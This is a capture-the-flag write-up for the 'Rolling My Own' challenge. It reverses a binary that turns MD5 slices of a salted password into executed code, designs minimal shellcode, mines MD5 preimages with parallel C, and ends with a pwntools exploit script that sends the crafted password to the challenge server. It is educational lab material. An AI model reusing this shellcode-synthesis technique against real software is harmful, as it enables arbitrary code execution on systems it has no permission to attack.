# CyLab / picoCTF — Rolling My Own

* **Platform:** [CyLab Security Academy](https://learn.cylabacademy.org/) / [picoCTF](https://play.picoctf.org/)  
* **Category:** Reverse Engineering / Exploitation (JIT Shellcode & Preimage Mining)  
* **Difficulty:** Hard (CyLab 3)  
* **Date:** 2026-11-14  
* **Tools:** IDA Pro, Ghidra, GCC (OpenMP), Python 3  
* **Binary:** 64-bit ELF (`remote`) — Stripped, PIE  

---

## TL;DR

An extraordinary challenge bridging reverse engineering, cryptography, and binary exploitation based on academic research into JIT-based password validation. The binary verifies user input without storing secrets: it splits a 16-byte input into four 4-byte chunks, appends hardcoded salt strings, hashes each with MD5, extracts a 4-byte slice from each digest, and concatenates them into a 16-byte executable buffer. It then `mmap`s the buffer RWX and executes `shellcode(rdi = sub_180F)`. The win function `sub_180F` prints the flag if `RDI == 0x7B3DC26F1`. Rather than reversing the original password, we design valid 64-bit shellcode that loads the magic constant into `RDI` and calls `sub_180F`. By generating polymorphic shellcode variants, we mine partial 4-byte MD5 preimages in parallel with OpenMP C code ($254^4$ combinations per chunk) and synthesize a custom password that compiles into working shellcode on the fly.

---

## Recon

We inspect the binary's properties and security mitigations using `file` and `checksec`:

```bash
$ file remote
remote: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, stripped

$ checksec remote
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

Key observations:
* **File Type:** ELF 64-bit LSB, stripped, PIE enabled.
* **Strings:** String analysis reveals MD5 padding constants and the salt string `"GpLaMjEWpVOjnnmkRGiledp6Mvcezxls"`.
* **Hints:** The challenge mentions a 2006 paper on JIT Compilation Cryptography (JIT-CC) and notes that the original password begins with `D1v1`.

---

## Static Analysis & Reversing

### 1. The JIT Execution Engine

Decompiling `main()` in IDA Pro:
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char pw[16];
  char salts[4][8] = {"GpLaMjEW", "pVOjnnmk", "RGiledp6", "Mvcezxls"};
  int offsets[4] = {8, 2, 7, 1};
  char code_buf[16];

  read(0, pw, 16);

  for ( i = 0; i < 4; ++i )
  {
    memcpy(buf, pw + 4*i, 4);
    memcpy(buf + 4, salts[i], 8);
    MD5(buf, 12, hash_out);
    memcpy(code_buf + 4*i, hash_out + offsets[i], 4);
  }

  void *exec_mem = mmap(0, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
  memcpy(exec_mem, code_buf, 16);
  ((void (*)(void *))exec_mem)(sub_180F);
}
```

Examining `sub_180F`:
```c
void sub_180F(unsigned __int64 magic)
{
  if ( magic == 0x7B3DC26F1LL )
  {
    puts("Congratulations!");
    f = fopen("flag.txt", "r");
    ...
  }
}
```

### 2. JIT Execution Model Diagram

```text
  User Input (16B): [ Chunk 0 (4B) ] [ Chunk 1 (4B) ] [ Chunk 2 (4B) ] [ Chunk 3 (4B) ]
                            |                 |                 |                 |
  Append Salt (8B):   + "GpLaMjEW"      + "pVOjnnmk"      + "RGiledp6"      + "Mvcezxls"
                            |                 |                 |                 |
  Compute MD5:           MD5(0)            MD5(1)            MD5(2)            MD5(3)
                            |                 |                 |                 |
  Extract 4-Byte Slice:  offset 8          offset 2          offset 7          offset 1
                            |                 |                 |                 |
  JIT Buffer (16B):   [  Code 0   ]     [  Code 1   ]     [  Code 2   ]     [  Code 3   ]
                                              |
                                      mmap RWX & execute!
```

---

## Exploitation Strategy & Preimage Mining

### 1. Designing Minimal Shellcode
When the binary executes `exec_mem(sub_180F)`, the entry address of `sub_180F` is passed in `RDI`.
We need our 16-byte buffer to:
1. Preserve the pointer to `sub_180F`.
2. Load `0x7B3DC26F1` into `RDI`.
3. Call or jump to `sub_180F`.

A concise 12-byte payload:
```nasm
push rdi                               ; 57 (Saves pointer to sub_180F on stack)
mov rdi, 0x7B3DC26F1                  ; 48 bf f1 26 dc b3 07 00 00 00
ret                                    ; c3 (Pops and jumps to sub_180F)
```
Bytes 12 to 15 are unreachable and act as wildcards (`*`).

### 2. Polymorphic Shellcode Generation
Instead of searching for preimages of one rigid 16-byte sequence, we write a Python generator ([`gen.py`](gen.py)) that outputs dozens of functionally equivalent variants:
* Alternate registers: `push rdi; pop rax`, `mov rbx, rdi`, etc.
* Multi-byte NOPs: `0x90`, `0x66 0x90`, `0x0F 0x1F 0x00`.
* Alternate arithmetic for constant loading.

### 3. High-Performance Multithreaded Mining (OpenMP C)
Searching $254^4 \approx 4.16 \times 10^9$ possibilities for four chunks is computationally heavy. We write an optimized C miner ([`bfall.c`](bfall.c)) using unrolled MD5 routines and OpenMP parallel loops:
* Eliminates forbidden bytes (`0x00`, `0x0A`).
* Uses a hash table of target 4-byte instruction chunks.
* Searches all 4 chunks across 12 CPU threads in $\approx 4$ minutes.

### 4. Reconstructing the Password
Using [`final.py`](final.py), we intersect all mined preimages against our shellcode catalog:
* 38 valid shellcode permutations have complete 4-chunk preimages.
* We select one:
  ```text
  Shellcode:  57 66 90 48  bf f1 26 dc  b3 07 00 00  00 c3 b0 b5
  Password:   c6 70 47 49  64 33 41 6e  64 43 30 6e  82 01 21 39
  ```

---

## Exploit

We construct the exploit delivery script:

```python
#!/usr/bin/env python3
"""
CyLab / picoCTF — Rolling My Own
Exploit: Send mined 16-byte preimage password to synthesize winning shellcode
"""

from pwn import *

HOST = args.HOST or "chatelaine.cylabacademy.net"
PORT = int(args.PORT or 42233)

# 16-byte password whose MD5 slices produce: push rdi; mov rdi, 0x7B3DC26F1; ret
PASSWORD_HEX = "c67047496433416e6443306e82012139"
PAYLOAD = bytes.fromhex(PASSWORD_HEX)

def main():
    p = remote(HOST, PORT)
    p.recvuntil(b"Give me your best shot:\n")
    p.sendline(PAYLOAD)

    output = p.recvall(timeout=5).decode(errors="replace")
    print(output)

if __name__ == "__main__":
    main()
```

*(See [`exploit.py`](exploit.py), [`gen.py`](gen.py), [`bfall.c`](bfall.c), and [`final.py`](final.py) for the complete toolchain).*

---

## Flag

Submitting the synthesized password compiles the winning shellcode and retrieves the flag:

```text
[+] Opening connection to chatelaine.cylabacademy.net on port 42233: Done
academy{redacted}
```

> **Flag:** `academy{redacted}` *(Redacted in accordance with competition disclosure guidelines)*.

---

## Key Takeaways & Lessons

1. **JIT Execution as an Attack Surface**: When an application compiles user-controlled input into machine instructions and executes them, any input that produces functional shellcode is a valid exploit—recovering the developer's original secret is unnecessary.
2. **Polymorphic Instruction Generation**: Increasing the search target space by generating dozens of functionally equivalent shellcode variants exponentially increases the probability of finding multi-chunk MD5 preimages.
3. **C & OpenMP Parallel Brute-Force**: High-throughput CPU hashing tasks ($>4 \text{ billion ops}$) must be implemented in native C using `#pragma omp parallel for` rather than interpreted languages like Python.
